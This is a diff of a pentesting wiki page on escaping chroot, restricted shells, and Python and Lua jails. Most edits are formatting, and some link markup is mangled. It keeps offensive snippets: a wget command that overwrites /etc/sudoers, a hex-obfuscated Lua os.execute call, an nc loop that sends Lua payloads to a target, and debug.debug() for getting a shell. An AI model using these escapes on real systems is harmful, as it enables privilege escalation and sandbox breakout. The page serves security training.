@@ -2,15 +2,15 @@
 
 ## **GTFOBins**
 
-**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io/) **if you can execute any binary with "Shell" property**
+**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**
 
 ## Chroot limitation
 
-From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations):  The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** \(**root**\) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.
+From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations):  The chroot mechanism is** not intended to defend** against intentional tampering by **privileged **(**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.
 
-Therefore, if you are **root** inside a chroot you **can escape** creating **another chroot**. However, in several cases inside the first chroot you won't be able to execute the chroot command, therefore you will need to compile a binary like the following one and run it:
+Therefore, if you are **root **inside a chroot you **can escape **creating **another chroot**. However, in several cases inside the first chroot you won't be able to execute the chroot command, therefore you will need to compile a binary like the following one and run it:
 
-{% code title="break\_chroot.c" %}
+{% code title="break_chroot.c" %}
 ```c
 #include <sys/stat.h>
 #include <stdlib.h>
@@ -125,24 +125,28 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 
 ### Other tricks
 
-[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)  
-[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**]%28https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)  
-[https://gtfobins.github.io](https://gtfobins.github.io**]%28https://gtfobins.github.io)  
+[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
+[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
+[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
 **It could also be interesting the page:**
 
-{% page-ref page="../useful-linux-commands/bypass-bash-restrictions.md" %}
+{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
+[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
+{% endcontent-ref %}
 
 ## Python Jails
 
 Tricks about escaping from python jails in the following page:
 
-{% page-ref page="../../misc/basic-python/bypass-python-sandboxes/" %}
+{% content-ref url="../../misc/basic-python/bypass-python-sandboxes/" %}
+[bypass-python-sandboxes](../../misc/basic-python/bypass-python-sandboxes/)
+{% endcontent-ref %}
 
 ## Lua Jails
 
-In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
+In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
 
-**Eval** with command execution**:**
+**Eval **with command execution**:**
 
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
@@ -174,11 +178,9 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
 
-**Get interactive lua shell**: If you are inside a limited lua shell you can get a new lua shell \(and hopefully unlimited\) calling:
+**Get interactive lua shell**: If you are inside a limited lua shell you can get a new lua shell (and hopefully unlimited) calling:
 
 ```bash
 debug.debug()
 ```
-
-
 
